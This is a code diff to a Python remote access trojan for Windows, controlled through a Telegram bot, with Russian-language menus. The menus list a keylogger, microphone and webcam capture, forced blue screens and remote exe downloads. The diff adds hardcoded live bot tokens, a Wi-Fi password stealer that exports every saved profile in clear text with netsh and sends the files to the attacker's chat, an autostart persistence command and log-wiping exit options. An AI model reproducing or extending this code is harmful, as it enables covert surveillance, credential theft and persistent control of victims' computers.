@@ -49,6 +49,7 @@ import wavio as wv
 from multiprocessing import Process
 
 
+#6619437777:AAGAmak2lcgXlaJc1KniqJrpT2sjlSwXpIg
 
 def send_audio(bot, chat_id):
     with open(r"C:\Users\Public\recorded.wav", "rb") as f:
@@ -75,7 +76,7 @@ auto = ''
 
 # API
 ##########################################################
-bot = telebot.TeleBot('YOUR_TOKEN')
+bot = telebot.TeleBot('6038725147:AAH0MLqKaSgJdgXPhQvhDLSdLd0XW2PSD5M')
 ##########################################################
 
 username = os.getlogin()
@@ -199,7 +200,12 @@ def My_PC(message):
 14. Синий экран смерти - /blue_screen
 15. Запись с микрофона - /microo
 16. Сделать фото с камеры - /web_camera
-17. Скачать какой-exe файл /downloads https://....</b>''')
+17. Скачать какой-exe файл /downloads https://....</b>
+18. Узнать к каким wifi был подключен пк - /wifi
+19. Узнать к какому wifi подключён пк щас - /real_wifi
+20. Пароли от всех wifi - /wifi_password
+21. Автозагрузка - /aurostart
+22. Выйти из системы снести автозагрузку удалить логи и тд. - /exit''')
     bot.send_message(message.chat.id, text, parse_mode='html')
     # Папка находится по этому пути C:\Users\Public\
     bot.send_message(message.chat.id, "Создание папки где будет лежить keyloger")
@@ -225,12 +231,28 @@ def screenshot(message):
         bot.send_message(message.chat.id, "Error")
 
 
+@bot.message_handler(commands=['kill_process_rat'])
+def kill_process_rat(message):
+    bot.send_message(message.chat.id, "Выключаю rat")
+    time.sleep(1)
+    sys.exit()
+
+@bot.message_handler(commands=['aurostart'])
+def auto_start(message):
+    try:
+        add_to_startup()
+        bot.send_message(message.chat.id, "Добавлено в автозагрузку")
+
+    except:
+        bot.send_message(message.chat.id, "Не получилось")
+
+
 @bot.message_handler(commands=['info', 'Info'])
 def ip(message):
     try:
         username = os.getlogin()
 
-        r = requests.get('ddd')
+        r = requests.get('https://api.ipify.org')
         ip = r.text
         windows = platform.platform()
         processor = platform.processor()
@@ -288,6 +310,29 @@ def wifi(message):
     output = get_wifi_profiles()
     if output:
         bot.send_message(message.chat.id, output)
+
+
+@bot.message_handler(commands=['wifi_password'])
+def wifi_password(message):
+    try:
+        subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True, text=True,
+                                encoding='cp866')
+
+        path = os.getcwd()
+        wifi_files = []
+
+        for filename in os.listdir(path):
+            if filename.endswith(".xml"):
+                wifi_files.append(filename)
+
+        for i in wifi_files:
+            with open(i, 'rb') as xml:
+                bot.send_document(message.chat.id, xml)
+                xml.close()
+            os.remove(i)
+
+    except:
+        bot.send_message(message.chat.id, "Какая та ошибка")
 
 
 @bot.message_handler(commands=['sites'])
@@ -453,7 +498,8 @@ def exut(message):
         bot.send_message(message.chat.id, '''Теперь можно либо выключить или перезапустить или выкинуть синий экран смерти
 1. /blue_screen - синька
 2. /reboot - Выключить ПК
-3. /restart - Перезапуск ПК''')
+3. /restart - Перезапуск ПК
+4. /kill_process_rat - Закрыть RAT''')
 
     except:
         bot.send_message(message.chat.id, "Неудалось удалить файлы")
